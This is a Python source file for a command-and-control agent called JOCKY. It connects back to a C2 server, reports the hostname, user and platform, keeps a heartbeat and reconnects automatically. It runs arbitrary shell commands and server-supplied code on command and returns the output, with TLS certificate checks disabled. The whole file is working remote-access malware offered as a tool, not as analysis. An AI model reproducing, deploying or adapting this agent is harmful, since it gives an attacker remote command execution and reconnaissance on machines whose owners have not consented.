"""
JOCKY C2 Agent — connects to the C2 server, executes JOCKY scripts on command,
and reports results back. Supports automatic reconnection and heartbeat.
"""
from __future__ import annotations
import asyncio
import json
import os
import platform
import socket
import sys
import tempfile
import time
import traceback
from typing import Optional

# ── Protocol constants (mirror server.py) ─────────────────────────────────────

MSG_HELLO  = "HELLO"
MSG_CMD    = "CMD"
MSG_RESULT = "RESULT"
MSG_PING   = "PING"
MSG_PONG   = "PONG"
MSG_BYE    = "BYE"

PROTOCOL_VERSION = "1"
FRAME_SEP = b"\n"
PING_INTERVAL = 30.0   # seconds
RECONNECT_DELAY = 10.0 # seconds

# ── System info ───────────────────────────────────────────────────────────────

def _collect_info() -> dict:
    return {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "arch":     platform.machine(),
        "python":   platform.python_version(),
        "pid":      os.getpid(),
        "user":     os.environ.get("USERNAME") or os.environ.get("USER", "unknown"),
    }

# ── Script execution ──────────────────────────────────────────────────────────

def _exec_script(script_path: str) -> dict:
    """Execute a .jk script file via the JOCKY compiler (JIT mode)."""
    import io
    compiler_dir = os.path.normpath(os.path.join(os.path.dirname(__file__), "..", "compiler"))
    try:
        if compiler_dir not in sys.path:
            sys.path.insert(0, compiler_dir)
        from compiler import compile_jocky
        buf = io.StringIO()
        old_out = sys.stdout
        sys.stdout = buf
        try:
            ok = compile_jocky(script_path, run_jit=True)
        finally:
            sys.stdout = old_out
        return {"status": "ok" if ok else "error", "output": buf.getvalue()}
    except Exception:
        return {"status": "error", "output": traceback.format_exc()}
    finally:
        if compiler_dir in sys.path:
            sys.path.remove(compiler_dir)

def _exec_code(code: str) -> dict:
    """Execute raw JOCKY source code by writing to a temp file then compiling."""
    tmp = None
    try:
        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".jk", delete=False, encoding="utf-8"
        ) as f:
            f.write(code)
            tmp = f.name
        return _exec_script(tmp)
    except Exception:
        return {"status": "error", "output": traceback.format_exc()}
    finally:
        if tmp and os.path.exists(tmp):
            try:
                os.unlink(tmp)
            except OSError:
                pass

# ── Agent ─────────────────────────────────────────────────────────────────────

class C2Agent:
    def __init__(
        self,
        host: str,
        port: int,
        tls: bool = False,
        reconnect: bool = True,
    ) -> None:
        self.host      = host
        self.port      = port
        self.tls       = tls
        self.reconnect = reconnect
        self.sid:   Optional[str] = None
        self._running = False

    async def _send(self, writer: asyncio.StreamWriter, msg: dict) -> None:
        writer.write(json.dumps(msg).encode() + FRAME_SEP)
        await writer.drain()

    async def _recv(self, reader: asyncio.StreamReader) -> Optional[dict]:
        try:
            line = await asyncio.wait_for(reader.readline(), timeout=PING_INTERVAL * 3)
            if not line:
                return None
            return json.loads(line.decode())
        except (asyncio.TimeoutError, json.JSONDecodeError, ConnectionResetError):
            return None

    async def _run_session(self) -> None:
        ssl_ctx = None
        if self.tls:
            import ssl
            ssl_ctx = ssl.create_default_context()
            ssl_ctx.check_hostname = False
            ssl_ctx.verify_mode = ssl.CERT_NONE

        reader, writer = await asyncio.open_connection(self.host, self.port, ssl=ssl_ctx)
        print(f"[AGENT] Connected to {self.host}:{self.port}")

        # HELLO handshake
        await self._send(writer, {"type": MSG_HELLO, "version": PROTOCOL_VERSION, "info": _collect_info()})
        hello = await self._recv(reader)
        if not hello or hello.get("type") != MSG_HELLO:
            print("[AGENT] Bad handshake")
            writer.close()
            return
        self.sid = hello.get("sid")
        print(f"[AGENT] Registered as SID {self.sid}")

        ping_task = asyncio.ensure_future(self._ping_loop(writer))
        try:
            while self._running:
                msg = await self._recv(reader)
                if msg is None:
                    print("[AGENT] Connection lost")
                    break
                mtype = msg.get("type", "")
                if mtype == MSG_PING:
                    await self._send(writer, {"type": MSG_PONG})
                elif mtype == MSG_CMD:
                    asyncio.ensure_future(self._handle_cmd(writer, msg))
                elif mtype == MSG_BYE:
                    break
        finally:
            ping_task.cancel()
            try:
                await self._send(writer, {"type": MSG_BYE})
            except Exception:
                pass
            writer.close()

    async def _ping_loop(self, writer: asyncio.StreamWriter) -> None:
        while True:
            await asyncio.sleep(PING_INTERVAL)
            try:
                await self._send(writer, {"type": MSG_PING})
            except Exception:
                break

    async def _handle_cmd(self, writer: asyncio.StreamWriter, msg: dict) -> None:
        action = msg.get("action", "")
        cmd_id = msg.get("cmd_id", "")
        result: dict

        if action == "exec_script":
            path = msg.get("script", "")
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, _exec_script, path)
        elif action == "exec_code":
            code = msg.get("code", "")
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(None, _exec_code, code)
        elif action == "shell":
            cmd_str = msg.get("cmd", "")
            result = await self._shell(cmd_str)
        else:
            result = {"status": "unknown_action", "action": action}

        await self._send(writer, {"type": MSG_RESULT, "cmd_id": cmd_id, **result})

    async def _shell(self, cmd: str) -> dict:
        try:
            import shlex
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=60)
            return {"status": "ok", "output": stdout.decode(errors="replace"), "returncode": proc.returncode}
        except asyncio.TimeoutError:
            return {"status": "timeout", "output": ""}
        except Exception:
            return {"status": "error", "output": traceback.format_exc()}

    async def run(self) -> None:
        self._running = True
        while self._running:
            try:
                await self._run_session()
            except (ConnectionRefusedError, OSError) as e:
                print(f"[AGENT] Could not connect: {e}")
            except Exception as e:
                print(f"[AGENT] Session error: {e}")

            if not self.reconnect or not self._running:
                break
            print(f"[AGENT] Reconnecting in {RECONNECT_DELAY}s …")
            await asyncio.sleep(RECONNECT_DELAY)

    def stop(self) -> None:
        self._running = False


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    tls  = "--tls" in sys.argv
    agent = C2Agent(host, port, tls=tls, reconnect=True)
    try:
        asyncio.run(agent.run())
    except KeyboardInterrupt:
        pass
